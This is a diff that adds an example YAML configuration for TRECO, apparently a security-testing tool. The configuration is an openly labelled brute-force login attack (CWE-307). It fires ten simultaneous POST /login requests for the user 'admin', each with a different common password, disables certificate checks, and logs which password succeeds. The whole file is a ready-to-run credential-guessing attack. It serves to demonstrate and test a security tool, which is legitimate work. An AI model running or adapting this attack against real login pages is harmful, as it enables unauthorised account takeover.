@@ -1,0 +1,82 @@
+# ============================================================================
+# TRECO Example: Input Distribution Mode - Brute Force Attack
+# ============================================================================
+#
+# This example demonstrates the DISTRIBUTE input mode where each thread
+# receives a different password from a list. Perfect for brute-force attacks
+# where you want to try multiple passwords simultaneously.
+#
+# Usage:
+#   export TARGET_HOST="example.com"
+#   treco examples/input-sources/01-distribute-mode.yaml
+#
+# ============================================================================
+
+metadata:
+  name: "Input Distribution Example - Brute Force"
+  version: "1.0"
+  author: "TRECO Team"
+  vulnerability: "CWE-307"
+  description: |
+    Demonstrates DISTRIBUTE mode where each thread gets a unique password
+    to test. Threads cycle through the password list if there are more
+    threads than passwords.
+
+target:
+  host: "{{ env('TARGET_HOST', 'example.com') }}"
+  port: 443
+  tls:
+    enabled: true
+    verify_cert: false
+
+entrypoint:
+  state: login_race
+  input:
+    username: "admin"
+    passwords:
+      - "password"
+      - "123456"
+      - "qwerty"
+      - "admin123"
+      - "letmein"
+      - "welcome"
+      - "monkey"
+      - "dragon"
+      - "master"
+      - "sunshine"
+
+states:
+  login_race:
+    description: "Attempt login with different passwords simultaneously"
+    
+    race:
+      threads: 10
+      input_mode: distribute  # Each thread gets a different password
+      sync_mechanism: barrier
+      connection_strategy: preconnect
+    
+    request: |
+      POST /login HTTP/1.1
+      Host: {{ target.host }}
+      Content-Type: application/x-www-form-urlencoded
+      
+      username={{ username }}&password={{ input.password }}
+    
+    logger:
+      on_state_enter: |
+        ╔═══════════════════════════════════════════════════════════════╗
+        ║  🔐 BRUTE FORCE ATTACK (DISTRIBUTE MODE)                      ║
+        ╠═══════════════════════════════════════════════════════════════╣
+        ║  Target: {{ target.host }}                                    ║
+        ║  Username: {{ username }}                                     ║
+        ║  Passwords: {{ passwords | length }} total                    ║
+        ║  Threads: 10                                                  ║
+        ║  Mode: DISTRIBUTE (each thread gets unique password)          ║
+        ╚═══════════════════════════════════════════════════════════════╝
+      
+      on_thread_leave: |
+        {% if response.status_code == 200 %}
+        ✅ Thread {{ thread.id }}: SUCCESS with password "{{ input.password }}"
+        {% else %}
+        ❌ Thread {{ thread.id }}: FAILED with password "{{ input.password }}"
+        {% endif %}
